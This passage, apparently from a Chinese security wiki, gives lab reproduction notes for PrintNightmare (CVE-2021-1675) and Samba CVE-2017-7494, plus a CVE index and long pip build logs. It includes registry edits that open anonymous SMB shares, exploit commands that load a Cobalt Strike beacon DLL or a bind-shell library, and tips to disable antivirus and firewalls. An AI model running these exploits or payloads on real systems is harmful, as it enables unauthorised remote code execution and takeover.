将beacon.dll放入C:\\share文件夹中，再继续执行以下命令 ⚠：一定要先将dll放入后再执行后续命令。 如果先将全部命令执行完，再放入文件，即便靶机cmd访问 1\\\\&lt;ip&gt; 并且能打开share文件夹，看到beacon.dll，但最后执行exp还是会报rpc access denied，exp利用失败 1234567icacls C:\\share\\ /T /grant &quot;Anonymous logon&quot;:ricacls C:\\share\\ /T /grant Everyone:rpowershell.exe New-SmbShare -Path C:\\share -Name share -ReadAccess &#x27;ANONYMOUS LOGON&#x27;,&#x27;Everyone&#x27;REG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipesREG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /fREG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous /t REG_DWORD /d 0 /f 可能会出现提示覆盖，那就Yes powershell那句在win 7、server2008登系统会报错win7需要对C:\\share右键，属性，在弹出的对话框中单击“共享”按钮，然后将Everyone添加进去，再点击“共享”按钮待写 漏洞利用 下载exp脚本CVE-2021-1675 1git clone https://github.com/cube0x0/CVE-2021-1675.git 12345678910111213141516171819202122232425usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target shareCVE-2021-1675 implementation.positional arguments: target [[domain/]username[:password]@]&lt;targetName or address&gt; share Path to DLL. Example &#x27;\\\\10.10.10.10\\share\\evil.dll&#x27;optional arguments: -h, --help show this help message and exitauthentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASHconnection: -target-ip ip address IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it -port [destination port] Destination port to connect to SMB ServerExample;./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 &#x27;\\\\192.168.1.215\\smb\\addCube.dll&#x27;./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 &#x27;C:\\addCube.dll&#x27; 参数： 域的FQDN 域内普通用户的账号和密码 打击目标 恶意dll的路径（匿名SMB共享文件夹or本地路径） http服务路径的文件不行，试过了。因为和漏洞利用过程有关 通过匿名SMB共享文件夹加载恶意dll加载本地路径的文件1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.140 &#x27;\\\\192.168.147.138\\share\\beacon.dll&#x27;1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.140 &#x27;C:\\share\\beacon.dll&#x27; 加载本地路径的文件在实际场景中，要先上传文件到靶机（已有目标的权限），相当于拿这个RCE当LPE用了 执行情况 SMB匿名共享 目标 rpcdump检测情况 exploit成功与否 server2016 dc 回显MS-RPRN和MS-PAR 成功，cs上线 win10（WD关闭） 回显MS-RPRN和MS-PAR 成功，cs上线 win10（WD开启） 失败，ERROR_VIRUS_INFECTED win7 回显MS-RPRN 失败，显示[-] Connection Failed win7 dc 回显MS-RPRN和MS-PAR 成功，cs上线 win10（WD关闭） 回显MS-RPRN和MS-PAR 成功，cs上线 server2016 回显MS-RPRN和MS-PAR 成功，cs上线 troubleshooting code: 0x5 - rpc_s_access_denied 原因一：DC是server2012，至于serv2012当DC为什么不行就不清楚了。当时试exp没试出来，翻到这个网页贴了一张图说serv2012当DC不行。github，issue9也有这个问题的反馈issue#9_impacket.dcerpc.v5.rpcrt.DCERPCException: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 原因二：排除了dc是server2012后，如果还是rpc access denied，可以试下本地路径的dll利用 1python3 CVE-2021-1675.py mytest.local/test02:test02@192.168.147.137 &#x27;C:\\share\\beacon.dll&#x27; 来说明靶机未修复这个洞，是smb匿名共享的问题 exp利用时回显[-] Connection Failed 情况 解决办法 rpcdump扫回显MS-RPRN和MS-PAR，能ping通 把防火墙关了 目标win7，rpcdump扫回显MS-RPRN，防火墙也关了 不清楚，我的实验环境对win7没exploit成功 ERROR_VIRUS_INFECTED 解决办法：关闭杀软 issue#46 ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software. 参考链接 参考链接🔗 备注 CVE-2021-1675 exp工具 PrintNightmare(CVE-2021-1675/CVE-2021-34527)复现 复现参考文章"},{"title":"目录","path":"/wiki/vuln_reproduction/目录_漏洞复现.html","content":"RCE windows 名称/编号 目标系统/组件/程序 影响范围 已复现版本 测不通的版本 PrintNightmare 打印机🖨程序 Windows 7Windows 8.1Windows 10Windows Server 2008 R2Windows Server 2012Windows Server 2016Windows Server 2019 server2019作为DC域里用户win7，server2016，win10均复现 server2012作为DC能复现加载本地的dll，SMB会rpc_s_access_denied ExchangeCVE-2021-26858/CVE-2021-27065 Exchange CVE-2021-27065/CVE-2021-26855/CVE-2021-26858：Exchange Server 2019 Cumulative Update 8Exchange Server 2019 Cumulative Update 7Exchange Server 2016 Cumulative Update 19Exchange Server 2016 Cumulative Update 18Exchange Server 2013 Cumulative Update 23 Exchange Server 2016 Cumulative Update 18 Exchange Server 2019 Cumulative Update 9 Exchange ProxyShell Exchange Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?) Linux 名称/编号 目标系统/组件/程序 影响范围 已复现版本 测不通的版本 Samba CVE-2017-7494 Samba 4.6.3(vulhub的)"},{"title":"Samba CVE-2017-7494","path":"/wiki/vuln_reproduction/Samba_CVE-2017-7494.html","content":"漏洞信息 名称/编号 影响范围 已复现版本 测不通的版本 CVE-2017-7494 4.6.3(vulhub的) gpt，待考证：CVE-2017-7494 影响的 Samba 版本是 3.5.0 至 4.5.4/4.5.10/4.4.14 漏洞复现 环境拓扑 虚拟机 ip Ubuntu(装有vulhub) 192.168.147.134 攻击机kali 使用vulhub中的samba作为靶机环境 靶机环境安装 安装docker 安装docker-compose docker-compost是一个单独工具，要独立安装 apt方式安装手动下载二进制文件方式安装12sudo apt updatesudo apt install docker-composecurl方式下载1sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/bin/docker-compose 或到github的release中下载拖进虚拟机，放到/usr/bin/ 1sudo mv docker-compose /usr/bin/docker-compose 赋予docker-compost可执行权限1sudo chmod +x /usr/bin/docker-compose 验证是否安装成功1docker-compose --version 下载vulhub镜像 1git clone https://github.com/vulhub/vulhub.git 启动Samba环境 1sudo docker-compose up -d exp运行环境 下载exp exp是python2写的，在kali中安装Python 2和pip（Python 2的） 12sudo apt updatesudo apt install python2 12curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.pysudo python2 get-pip.py 安装exp相关的依赖 1sudo python2 -m pip install -r requirements.txt 漏洞利用 Exploit’s arguments explained: 12usage: exploit.py [-h] -t TARGET -e EXECUTABLE -s REMOTESHARE -r REMOTEPATH [-u USER] [-p PASSWORD] [-P REMOTESHELLPORT] -t or —target - Set the remote host to attack. -e or —executable - Set the path on your local system where the lib that you want to load is located. -s or —remoteshare - Remote share where the file will be copied. -r or —remotepath - Where the file is located on the remote system. -u or —user - Username to log in with. -p or —password - Password to use to log in with. -P or —remoteshellport - If you are using a bind shell payload, connect to the payload after the attack is executed. exp利用效果：在目标服务器上执行/home/share/libbindshell-samba.so 参数： -t：靶机ip -e：要执行的.so文件 -s：目标Samba共享目录 -u，-p：用户名和密码，匿名smb的话可以任意填写 其中myshare是分享名称（在vulhub中为myshare），而/home/share是对应的可写目录。-u和-p用来指定用户名、密码，当前环境是一个匿名smb，所以填写任意信息均可。 因为libbindshell-samba.so是一个bindshell，监听地址是6699，所以我们通过-P指定这个端口。在实际渗透中，我们可以修改libbindshell-samba.c，写入任意其他代码，如反弹shell，避免使用bindshell Samba 远程命令执行漏洞（CVE-2017-7494） 1python2 exploit.py -t 192.168.147.134 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699 pip安装依赖时遇到的报错 setuptools包的问题 1234567891011121314151617┌──(kali㉿kali)-[~/Desktop/exploit-CVE-2017-7494-master]└─$ sudo python2 -m pip install -r requirements.txtDEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality. Collecting git+https://github.com/opsxcq/impacket.git (from -r requirements.txt (line 2)) Cloning https://github.com/opsxcq/impacket.git to /tmp/pip-req-build-Gd1w9Q Running command git clone -q https://github.com/opsxcq/impacket.git /tmp/pip-req-build-Gd1w9Q ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-req-build-Gd1w9Q/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-req-build-Gd1w9Q/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; egg_info --egg-base /tmp/pip-pip-egg-info-KLPswK cwd: /tmp/pip-req-build-Gd1w9Q/ Complete output (7 lines): /usr/share/cffi-wheels/setuptools-44.1.0-py2.py3-none-any.whl/setuptools/dist.py:476: UserWarning: Normalizing &#x27;0.9.16-dev&#x27; to &#x27;0.9.16.dev0&#x27; usage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...] or: setup.py --help [cmd1 cmd2 ...] or: setup.py --help-commands or: setup.py cmd --help error: invalid command &#x27;egg_info&#x27; 解决办法： 更新或安装 setuptools，然后重新安装依赖 1sudo python2 -m pip install --upgrade setuptools 1sudo python2 -m pip install -r requirements.txt Python的开发包的问题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401┌──(kali㉿kali)-[~/Desktop/exploit-CVE-2017-7494-master]└─$ sudo python2 -m pip install -r requirements.txt DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality. Collecting git+https://github.com/opsxcq/impacket.git (from -r requirements.txt (line 2)) Cloning https://github.com/opsxcq/impacket.git to /tmp/pip-req-build-XarPcL Running command git clone -q https://github.com/opsxcq/impacket.git /tmp/pip-req-build-XarPcLCollecting pycrypto==2.6 Downloading pycrypto-2.6.tar.gz (443 kB) |████████████████████████████████| 443 kB 922 kB/s Collecting pyasn1 Downloading pyasn1-0.5.1-py2.py3-none-any.whl (84 kB) |████████████████████████████████| 84 kB 416 kB/s Building wheels for collected packages: pycrypto, impacket Building wheel for pycrypto (setup.py) ... error ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; bdist_wheel -d /tmp/pip-wheel-chcgDk cwd: /tmp/pip-install-lukwux/pycrypto/ Complete output (211 lines): running bdist_wheel running build running build_py creating build creating build/lib.linux-x86_64-2.7 creating build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/pct_warnings.py -&gt; build/lib.linux-x86_64-2.7/Crypto creating build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/hashalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash creating build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/blockalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_OAEP.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher creating build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/randpool.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py21compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/RFC1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/_number_new.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py3compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util creating build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/_UserFriendlyRNG.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random creating build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/rng_base.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/st_common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_oaep.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_rfc1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_importKey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_rpoolcompat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_generic.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_pss.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature creating build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/Chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol creating build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_slowmath.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/pubkey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_PSS.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature running build_ext running build_configure checking for gcc... gcc checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether we are using the GNU C compiler... yes checking whether gcc accepts -g... yes checking for gcc option to accept ISO C89... none needed checking for __gmpz_init in -lgmp... yes checking for __gmpz_init in -lmpir... no checking whether mpz_powm is declared... yes checking whether mpz_powm_sec is declared... yes checking how to run the C preprocessor... gcc -E checking for grep that handles long lines and -e... /usr/bin/grep checking for egrep... /usr/bin/grep -E checking for ANSI C header files... yes checking for sys/types.h... yes checking for sys/stat.h... yes checking for stdlib.h... yes checking for string.h... yes checking for memory.h... yes checking for strings.h... yes checking for inttypes.h... yes checking for stdint.h... yes checking for unistd.h... yes checking for inttypes.h... (cached) yes checking limits.h usability... yes checking limits.h presence... yes checking for limits.h... yes checking stddef.h usability... yes checking stddef.h presence... yes checking for stddef.h... yes checking for stdint.h... (cached) yes checking for stdlib.h... (cached) yes checking for string.h... (cached) yes checking wchar.h usability... yes checking wchar.h presence... yes checking for wchar.h... yes checking for inline... inline checking for int16_t... yes checking for int32_t... yes checking for int64_t... yes checking for int8_t... yes checking for size_t... yes checking for uint16_t... yes checking for uint32_t... yes checking for uint64_t... yes checking for uint8_t... yes checking for stdlib.h... (cached) yes checking for GNU libc compatible malloc... yes checking for memmove... yes checking for memset... yes configure: creating 